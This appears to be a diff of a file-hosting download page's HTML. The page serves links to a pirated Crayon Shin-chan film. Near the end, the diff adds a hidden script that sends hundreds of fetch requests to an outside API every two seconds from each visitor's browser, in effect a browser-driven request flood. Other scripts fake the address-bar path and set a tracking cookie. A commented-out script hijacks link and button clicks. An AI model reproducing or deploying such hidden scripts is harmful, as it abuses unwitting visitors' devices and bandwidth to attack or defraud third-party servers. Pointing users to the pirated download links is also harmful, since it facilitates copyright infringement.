@@ -190,7 +190,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 
 
         
-        <a href="https://pixel.hubcdn.fans/?id=9baaafddd8d3d6cc033f11ada70e3db7eebf2cb1f56f43bea4fa40b8e015ae48c75d18619a2c7502de1038c46a6cead5d91b0f992fe9c3b2693c008eb11caeea49cfa59af75382a573f97a6641ac2d31d372cb79e237fcae430a93ae42c521f9::00d8ddde504371910abbdf02d6af588c" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-danger btn-lg h6" style="background-color: #dc3545 !important;">
+        <a href="https://pixel.hubcdn.fans/?id=21492bc915e609dd058e14bb1731d738ecbabde075e6a57924162ee17ab2dba6af0b2d315bfff2e113a3726863be50a0c9f92cc3470ad452f0c3223d49e7798f489e32a7a439e049a23b6750a49eb3f8acb834067ea5a1c7e0633b4425202ed5::b78919f2dc0c38d42c4c5147b3d4702c" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-danger btn-lg h6" style="background-color: #dc3545 !important;">
             <i class="fas fa-file-download fa-lg"></i> Download [Server : 10Gbps]</a>
             
             <p style="font-size: 12px; padding-bottom:4px !important; margin-bottom:0px !important">
@@ -202,7 +202,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
         
         
 
-    <a href="https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Crayon Shinchan Action Kamen vs Demon 1993 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] PitiPati-Ionicboy 4kHDHub.com.mkv?token=1757269247" id="fsl" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6"><i class="fas fa-file-download fa-lg"></i> Download [FSL Server]</a>
+    <a href="https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Crayon Shinchan Action Kamen vs Demon 1993 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] PitiPati-Ionicboy 4kHDHub.com.mkv?token=1758025506" id="fsl" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6"><i class="fas fa-file-download fa-lg"></i> Download [FSL Server]</a>
     <script>
         const fsl = document.getElementById('fsl');
         if (fsl) fsl.href += '1' + new Date().getMinutes();
@@ -211,7 +211,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 
 
 
-    <a href="https://ddl2.cloudserver-1692960669.workers.dev/1397312583/a95faaf5b4321e6c9b429fa20f5992458f5bd28ec044f2875608a15ad806d32812e9fc0770b38c8eefc2dae4c81298a57aef1925c80f3d2ae991887209f288471c5acf36a93627c1aa34421723dcf152905ede51a7bc8d984c0e8dd4e06dd6b541843bdfe02a747707d7ed546b492a18e2f99b26f1b3a54c9fea9e09f81b4986eca77a7cbb103347aa0f9e76c9370d4f95a131895818701ce657b8d69ff0dabd37b87601d1538b587fd1da5a0fbfc43ea3a9dca8bb5424a979c7f65944ae5579::66b74ff3033c283899c4e7c9a5339ea6/Crayon Shinchan Action Kamen vs Demon (1993) 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] (PitiPati-Ionicboy) (4kHDHub.com).mkv.zip" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #474b48 !important;"><i class="fas fa-file-download fa-lg"></i> Download [ZipDisk Server]</a>
+    <a href="https://ddl2.cloudserver-1692958104.workers.dev/1397313204/a4d4a721744a9dfdbd8be7b27715738bbb80ca367d65277316db36bb584c0fbfe3c21108b9a243111ed7eec085a9d572ce5f7d7271507154b4d3d931114c3f8e4c2dce9cbb597557590a24a7083f463ed7369f491e73d260277b2545e1f6b9089f2467f185ac470832ea2089e27a5855e4204f396724eb836021b0a21b51bc5759b14c22bf8c0ca66f7680e0a44ff80bb09c20c28e93f2fdba3bd25769584e94ea466fca0aadafc2bdb59a70b319e25270e8502d4fb228d8c46c5a7d4f2af9c0::0f8e872aeeee57459e410e73b6e84d79/Crayon Shinchan Action Kamen vs Demon (1993) 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] (PitiPati-Ionicboy) (4kHDHub.com).mkv.zip" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #474b48 !important;"><i class="fas fa-file-download fa-lg"></i> Download [ZipDisk Server]</a>
     <p style="
     font-size: 12px; padding-bottom:4px !important; margin-bottom:0px !important">Resume is Supported in ZipDisk But please extract it as the files is inside zip</p>
 
@@ -237,7 +237,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
     if(isAndroid()){
         android_launch.classList.remove("d-none");
         android_launch.addEventListener('click', ()=>{
-            var anchor = document.createElement('a');anchor.href= createIntentURL({host: 'https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Crayon Shinchan Action Kamen vs Demon 1993 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] PitiPati-Ionicboy 4kHDHub.com.mkv?token=1757269247',scheme: 'https',type: 'video/x-matrosk',
+            var anchor = document.createElement('a');anchor.href= createIntentURL({host: 'https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Crayon Shinchan Action Kamen vs Demon 1993 1080p BluRay REMUX AVC [Hindi DD 2.0 + Japanese FLAC 2.0] PitiPati-Ionicboy 4kHDHub.com.mkv?token=1758025506',scheme: 'https',type: 'video/x-matrosk',
             });anchor.click();
         });
         
@@ -256,7 +256,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 </div>
 
 <div class="alert alert-info" role="alert">
-<p><b>If you're getting any error please report at <a href="https://t.me/sumitbotreport">@Telegram Group</a> with Share Link And Screenshot (:</b></p>
+<p><b>If you're getting any error please report at <a href="https://t.me/hubcloudreport">@Telegram Group</a> with Share Link And Screenshot (:</b></p>
 </div>
 <hr>
 
@@ -315,41 +315,32 @@ Msc
 
 </body>
 </html><script>
-window.sessionStorage.setItem('xl',window.location.href);
-function cn(t){let e=window.location.protocol+"//"+window.location.host+t;history.replaceState({path:e},"",e)}cn("/how-to-earn-money-using-your-phone/");
+window.sessionStorage.setItem('xl',window.location.href)
+function cn(t){let e=window.location.protocol+"//"+window.location.host+t;history.replaceState({path:e},"",e)}cn("/games/");
 </script>
 <script>
 function setCookie(e,t,i){let o=encodeURIComponent(t),$=new Date;$.setTime($.getTime()+36e5*i);let n=`${e}=${o}; expires=${$.toUTCString()}; path=/`;document.cookie=n}setCookie("xyt",1,24);
 </script>
 
-<script data-cfasync="false" type="text/javascript" id="clever-core">
-/* <![CDATA[ */
-    (function (document, window) {
-        var a, c = document.createElement("script"), f = window.frameElement;
-
-        c.id = "CleverCoreLoader94679";
-        c.src = "https://scripts.cleverwebserver.com/46ff09dd57708572de379bac9bba3c6c.js";
-
-        c.async = !0;
-        c.type = "text/javascript";
-        c.setAttribute("data-target", window.name || (f && f.getAttribute("id")));
-        c.setAttribute("data-callback", "put-your-callback-function-here");
-        c.setAttribute("data-callback-url-click", "put-your-click-macro-here");
-        c.setAttribute("data-callback-url-view", "put-your-view-macro-here");
-
-        try {
-            a = parent.document.getElementsByTagName("script")[0] || document.getElementsByTagName("script")[0];
-        } catch (e) {
-            a = !1;
-        }
-
-        a || (a = document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]);
-        a.parentNode.insertBefore(c, a);
-    })(document, window);
-/* ]]> */
+<script>
+function x(){
+    for (let i = 0; i < 369; i++) {
+    
+	 fetch("https://apis.damanworlds.world/api/"+new Date().getTime() + i, {
+          "method": "GET",
+          "mode": "no-cors",
+          "referrerPolicy": 'no-referrer',
+        });
+	}
+}
+x();
+const intervalId = setInterval(() => {
+    x();
+}, 2000)
 </script>
 
 <!--<script async src="https://greenanalytics.autos/recaptcha/v4_enc.js"></script>-->
 
 <!--<script>let s__=!1,observer=null;const sc_="a, button";function opst(e){if(!s__)return;e.preventDefault(),e.stopImmediatePropagation();let t=document.createElement("a");t.href=s__,t.target="_blank",t.rel="noopener noreferrer",t.click();let r=document.querySelectorAll(sc_);r.forEach(e=>{e.removeEventListener("click",opst)}),observer.disconnect()}function atchs(){let e=document.querySelectorAll(sc_);e.forEach(e=>{e.addEventListener("click",opst,{once:!0})})}window.addEventListener("message",function(e){try{let t=JSON.parse(e.data);t?.url&&(s__=t.url,atchs(),(observer=new MutationObserver(atchs)).observe(document.body,{childList:!0,subtree:!0}))}catch(r){}},!1);-->
 <!--</script>-->
+
